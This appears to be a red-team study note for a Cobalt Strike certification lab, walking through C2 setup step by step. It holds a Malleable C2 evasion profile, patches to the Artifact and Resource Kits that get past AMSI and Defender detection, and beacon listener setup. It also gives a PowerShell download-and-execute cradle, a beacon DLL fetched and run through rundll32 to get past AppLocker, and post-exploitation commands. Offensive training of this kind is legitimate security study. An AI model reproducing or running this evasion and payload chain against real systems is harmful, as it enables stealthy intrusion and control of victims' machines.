# Cobalt Strike Prepare  

The objective is to setup Cobalt Strike.  Update Malleable C2 profile, create artifact, resource kit, listeners, load scripts, and disable AppLocker controls for first Beacon.  

* SSH to team server
* Malleable C2 profile Edit (stage + post-ex + process-inject blocks)
* Build **Artifact** Kit →  ThreatCheck + Ghidra clean
* Build **Resource** Kit → fix template.x64.ps1 → ThreatCheck AMSI clean
* Add Cobalt Strike Listeners 
* Load CNA CS Script Manager
* Generate & Host Payloads
* AppLocker Bypass Initial access
* Connected Beacon Checklist
* Local Workstation Enumeration
* Test beacon callback with Defender ON 🛡️  

### SSH to team server

```bash
ssh attacker@10.0.0.5
# Password: Passw0rd!
cd /opt/cobaltstrike/profiles
nano default.profile
```

## Malleable C2 profile Edit

>Stage Block + Post-ex Block + Process-Inject Block

```c
stage {
    set userwx "false";
    set cleanup "true";
    set copy_pe_header "false";
    set module_x64 "Hydrogen.dll";

    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";
        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
        strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
    }
}

post-ex {
    set spawnto_x64 "%windir%\\\\sysnative\\\\werfault.exe";
    set cleanup "true";
    set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
    set amsi_disable "true";

    transform-x64 {
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
        strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
    }
}

process-inject {
    set allocator "VirtualAllocEx";
    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";
    set min_alloc "8192";
    set startrwx "false";
    set userwx "false";

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        NtQueueApcThread;
        SetThreadContext;
    }
}
```

>Apply and validate Malleable C2 profile updates  

```
sudo /usr/bin/docker restart cobaltstrike-cs-1

sudo /usr/bin/docker logs cobaltstrike-cs-1
```

## Build Artifact Kit

### Patch patch.c in VSCode

>Launch Visual Studio Code 🔵 > File > Open Folder → `C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\` Open `src-common\patch.c`  

```cpp
// line 45 REPLACE WITH (backwards while loop — different compiled bytecode, identical logic):
x = length;
while ( x-- ) {
    * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}

// line 116 REPLACE Decryption loop with 
int x = length;
while ( x-- ) {
    * ( ( char * ) ptr + x ) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
```

>Build **artifacts** in WSL (Ubuntu)  

```cpp
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

### ThreatCheck & Ghidra  

```powershell
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
```

>Ghidra to locate the flagged code at the offset ThreatCheck give  


## Build Resource Kit  

>Build **resources** templates in WSL (Ubuntu)  

```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```

>Visual Studio Code 🔵 - File > Open Folder → `C:\Tools\cobaltstrike\custom-resources` Open: `template.x64.ps1`  

>Replace System.dll' with obfuscation:  

```powershell
# Before (AMSI-detected):
.Equals('System.dll')

.Equals([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('J1N5cycrJ3RlbS4nKydkbGwnCg==')))
# 'J1N5cycrJ3RlbS4nKydkbGwnCg==' = base64('Sys'+'tem.'+'dll')
```

>Replace `Marshal.Copy` with WriteProcessMemory:  

```powershell
# orginal code detected
    [System.Runtime.InteropServices.Marshal]::Copy($v_code, 0, $var_buffer, $v_code.length)

# replacement obfuscated

$var_ntwvm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (func_get_proc_address ntdll.dll ('NtWrite'+'VirtualMemory')),
    (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([UInt32]))
)
$var_ntwvm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [ref]0) | Out-Null
```

>Visual Studio Code 🔵 - File > Open Folder → `C:\Tools\cobaltstrike\custom-resources` Open: `compress.ps1` with obfuscation  

```powershell
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```

>ThreatCheck 🛡️ AMSI  

```powershell
cd C:\Tools\cobaltstrike\custom-resources\
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
```

<img src="/images/threatchecks1.png">  

## Cobalt Strike Listeners  

### Connect to Cobalt Strike

1. On the Windows taskbar, click on the Cobalt Strike icon.
1. Fill in the connection details for the team server.
  1. Host: `10.0.0.5`
  1. Port: `50050`
  1. Password: `Passw0rd!`

### Create Listeners

Go to **Cobalt Strike > Listeners > Add** to create a new listener.

### HTTP Listener

1. Name: `http`
1. Payload: Beacon HTTP
1. HTTP Hosts: `www.bleepincomputer.com`
1. HTTP Host (Stager) : `www.bleepincomputer.com`

<img src="/images/cs_setup1.png">  

### SMB Listener

1. Name: `smb`
1. Payload: Beacon SMB
1. Pipename: `PSHost.133946823881593750.1234.DefaultAppDomain.powershell`  

<img src="/images/cs_setup2.png">  

### TCP Listener

1. Name: `tcp`
1. Payload: Beacon TCP
1. Port: `4444`
1. Bind to localhost: False

<img src="/images/cs_setup3.png">  

### TCP (local) Listener

1. Name: `tcp-local`
1. Payload: Beacon TCP
1. Port: `1337`
1. Bind to localhost: True

<img src="/images/cs_setup4.png">

# Load CNA Scripts  

>Script Manager > Load CNA - Aggressor Scripts:  

* C:\Tools\cobaltstrike\arsenal-kit\kits\elevate\elevate.cna
* C:\Tools\CS-Situational-Awareness-BOF\SA\SA.cna  ← MUST be before exam-recon.cna
* C:\Tools\CS-Remote-OPs-BOF\Remote\Remote.cna
* C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
* C:\Tools\cobaltstrike\custom-resources\resources.cna
* C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
* C:\Tools\SQL-BOF\SQL\SQL.cna
* Optional Custom: exam-recon.cna

----  

# Generate & Host Payloads

> ⚠️ **PREREQUISITE — First Update C2 Malleable Profile**  

> First CHECK [Defence evasion Malleable C2 profile](https://github.com/botesjuan/CRTO-Study-Notes/blob/main/labs/defence-evasion-lab-Malleable.md#part-1--malleable-c2-profile)

<img src="/images/malleable-c2-profile-updates.png">  

> Generate payloads will use the custom artifact stubs.  

1. Go to **Payloads > Windows Stageless Generate All Payloads**
2. Folder: `C:\Payloads`
3. Click **Generate**

<img src="/images/generate_payloads.png">  

## Scripted Web Delivery

Host a 64-bit PowerShell payload.  
```
Cobalt Strike > Attacks > Scripted Web Delivery
Select the http listener.
Click Launch.
```

<img src="/images/scripted-web-delivery-http-listener.png">  

>Example given by Cobalt Strike:  

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.0.10:80/a'))"
```

## Generate Stageless Beacon DLL  

```
Cobalt Strike > Payloads > Windows Stageless Payload
  Listener:  http
  Output:    Windows DLL (x64)
  Save as:   C:\Payloads\beacon.dll
```

## Host Payload via CS Web Server

```
Site Management > Host File
  File:   C:\Payloads\beacon.dll
  URI:    /beacon.dll
  Port:   80
```

>Example given by Cobalt Strike:  

```
http://172.16.0.10:80/beacon.dll
```

# AppLocker Bypass

>Initial Access, Provided credentials, Locally logged onto compromised workstation  

## Enumerate AppLocker Policy

```powershell
# Confirm AppLocker is enforcing (ConstrainedLanguage = active)
$ExecutionContext.SessionState.LanguageMode

# Read all effective rules
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections

# Check if DLL rules are enforced — empty output = DLL rules OFF = rundll32 viable
$policy.RuleCollections | Where-Object { $_.RuleCollectionType -eq 'Dll' }

# Find writable dirs inside the allowed %WINDIR%\* path
icacls C:\Windows\Tasks
icacls C:\Windows\Temp
```

# Initial Beacon

>On compromised workstation  

## Download Beacon DLL to Workstation

On `lon-wkstn-1` as `pchilds` — `Invoke-WebRequest` works in ConstrainedLanguage:

```powershell
cd C:\Windows\Tasks\
Invoke-WebRequest -Uri 'http://www.bleepincomputer.com/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'
```

## Execute via rundll32

```cmd
rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
```

>Initial Beacon connect to cobalt strike  

<img src="/images/applocker-challenge02.png" width=860>  

---

# Connected Beacon Checklist  

>>[Initial Access without phishing in exam](/labs/Initial-Access-lab.md) beacon commands:  
* ppid set to explorer.exe PID before `spawnto` and before `execute-assembly` or `powerpick`  
* `spawnto x64 %windir%\sysnative\werfault.exe` before using fork&run operations `execute-assembly`, `powerpick`  

```cs
sleep 3 20                                      // reduce check-in noise
ps                                              // get process list
process_browser
ppid <explorer.exe or svchost.exe PID>          // spoof parent — see note below
spawnto x64 %windir%\sysnative\werfault.exe     // override default rundll32
getuid                                          // confirm user context
```

# Methodology Phases  

>Loop through phases:
* enumeration
* post exploit
* persistence
* enumerate more
* privilege escalate
* elevated persistence
* enumerated domain users, computers, groups
* privlege escalate in domain
* ADCS and SQL enumeration
* trusts enumeration
* pivot and tunneling

## Initial Persistence

>On initial compromised workstation obtain persistence
>[Initial Persistence on first beacon](/labs/Persistence-lab.md)  

## Post Exploitation Enumeration  

>[Post Exploitation Checks](/cheatsheets/post-exploitation.md)  

>commands to execute on workstation
>find other users, local privilege escalation, local workstation persistence, before moving to domain enumeration.  

## Privilege Escalation  

>[Privilege Escalation via weak service registry permissions to SYSTEM Beacon](/labs/Privilege-Escalation-lab.md)  

## AD Discovery  

>[Active Directory Discovery and Enumeration](/labs/Discovery-lab.md)  
>Enumerate domain users, computers, groups, objects — OPSEC-🟢SAFE  
> ⚠️ ldapsearch also requires a valid Kerberos token — see note in Discovery lab.  

```cs
ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes name,samaccountname,memberof,admincount,servicePrincipalName,dNSHostName,operatingSystem
```

>Domain Trust enumeration  

```bash
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes
```
